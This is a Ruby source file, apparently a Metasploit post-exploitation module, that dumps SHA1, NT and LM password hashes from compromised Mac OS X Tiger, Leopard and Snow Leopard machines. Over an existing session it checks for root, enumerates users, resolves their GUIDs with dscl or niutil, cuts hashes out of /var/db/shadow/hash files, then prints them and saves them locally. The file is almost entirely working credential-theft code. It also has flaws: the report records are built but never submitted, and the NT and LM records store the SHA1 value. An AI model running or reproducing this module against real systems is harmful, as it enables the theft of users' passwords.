##
# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'

require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Auxiliary::Report 

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Module for dumping OSX saved hashes',
				'Description'   => %q{ Post Exploitation module to dump SHA1, LM and NT Hashes of an OSX Tiger, Leopard and Snow Leopard System},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'osx' ],
				'SessionTypes'  => [ "shell" ]
			))

	end

	# Run Method for when run command is issued
	def run
		case session.type
		when /meterpreter/
			host = session.sys.config.sysinfo["Computer"]
		when /shell/
			host = session.shell_command_token("hostname").chomp
		end
		print_status("Running module against #{host}")
		running_root = check_root
		if running_root
			print_status("This session is running as root!")
		end
		ver_num = get_ver
		log_folder = log_folder_create()
		if running_root
			print_status("Saving files with hashes in #{log_folder} and Database")
			dump_hash(log_folder,ver_num)
		else
			print_error("Insufficient Privileges you must be running as root to dump the hashes")
		end
	end

	# Function for creating the folder for gathered data
	def log_folder_create(log_path = nil)
		#Get hostname
		case session.type
		when /meterpreter/
			host = Rex::FileUtils.clean_path(session.sys.config.sysinfo["Computer"])
		when /shell/
			host = Rex::FileUtils.clean_path(session.shell_command_token("hostname").chomp)
		end

		# Create Filename info to be appended to downloaded files
		filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

		# Create a directory for the logs
		if log_path
			logs = ::File.join(log_path, 'logs', "enum_osx", host + filenameinfo )
		else
			logs = ::File.join(Msf::Config.log_directory, "post", "enum_osx", host + filenameinfo )
		end

		# Create the log directory
		::FileUtils.mkdir_p(logs)
		return logs
	end

	# Checks if running as root on the target
	def check_root
		# Get only the account ID
		case session.type
		when /shell/
			id = session.shell_command_token("/usr/bin/id -ru").chomp
		when /meterpreter/
			id = cmd_exec("/usr/bin/id","-ru").chomp
		end
		if id == "0"
			return true
		else
			return false
		end
	end


	# Enumerate the OS Version
	def get_ver
		# Get the OS Version
		case session.type
		when /meterpreter/
			osx_ver_num = cmd_exec("/usr/bin/sw_vers", "-productVersion").chomp
		when /shell/
			osx_ver_num = session.shell_command_token("/usr/bin/sw_vers -productVersion").chomp
		end

		return osx_ver_num
	end

	# Dump SHA1 Hashes used by OSX, must be root to get the Hashes
	def dump_hash(log_folder,ver_num)
		print_status("Dumping Hashes")
		users = []
		host,port = session.tunnel_peer.split(':')
		case session.type
		when /meterpreter/
			users_folder = cmd_exec("/bin/ls","/Users")
		when /shell/
			users_folder = session.shell_command_token("/bin/ls /Users")
		end
		users_folder.each_line do |u|
			next if u.chomp =~ /Shared|\.localized/
			users << u.chomp
		end

		# Path to files with hashes
		nt_file = ::File.join(log_folder,"nt_hash.txt")
		lm_file = ::File.join(log_folder,"lm_hash.txt")
		sha1_file = ::File.join(log_folder,"sha1_hash.txt")

		# Process each user
		users.each do |user|
			if ver_num =~ /10\.(6|5)/
				case session.type
				when /meterpreter/
					guid = cmd_exec("/usr/bin/dscl", "localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
				when /shell/
					guid = session.shell_command_token("/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
				end
			elsif ver_num =~ /10\.(4|3)/
				case session.type
				when /meterpreter/
					guid = cmd_exec("/usr/bin/niutil","-readprop . /users/#{user} generateduid").chomp
				when /shell/
					guid = session.shell_command_token("/usr/bin/niutil -readprop . /users/#{user} generateduid").chomp
				end
			end

			# Extract the hashes
			case session.type
			when /meterpreter/
				sha1_hash = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c169-216").chomp
				nt_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c1-32").chomp
				lm_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c33-64").chomp
			when /shell/
				sha1_hash = session.shell_command_token("/bin/cat /var/db/shadow/hash/#{guid}  | cut -c169-216").chomp
				nt_hash   = session.shell_command_token("/bin/cat /var/db/shadow/hash/#{guid}  | cut -c1-32").chomp
				lm_hash   = session.shell_command_token("/bin/cat /var/db/shadow/hash/#{guid}  | cut -c33-64").chomp
			end

			# Check that we have the hashes and save them
			if sha1_hash !~ /00000000000000000000000000000000/
				print_status("SHA1:#{user}:#{sha1_hash}")
				file_local_write(sha1_file,"#{user}:#{sha1_hash}")
				report_hash = {
					:host   => host,
					:port   => 0,
					:sname  => 'sha1',
					:user   => user,
					:pass   => sha1_hash,
					:active => false
				}
			end

			if nt_hash !~ /000000000000000/
				print_status("NT:#{user}:#{nt_hash}")
				file_local_write(nt_file,"#{user}:#{nt_hash}")
				report_hash = {
					:host   => host,
					:port   => 445,
					:sname  => 'smb',
					:user   => user,
					:pass   => sha1_hash,
					:active => true
				}
			end
			if lm_hash !~ /0000000000000/
				print_status("LM:#{user}:#{lm_hash}")
				file_local_write(lm_file,"#{user}:#{lm_hash}")
				report_hash = {
					:host   => host,
					:port   => 445,
					:sname  => 'smb',
					:user   => user,
					:pass   => sha1_hash,
					:active => true
				}
			end
		end
	end
end
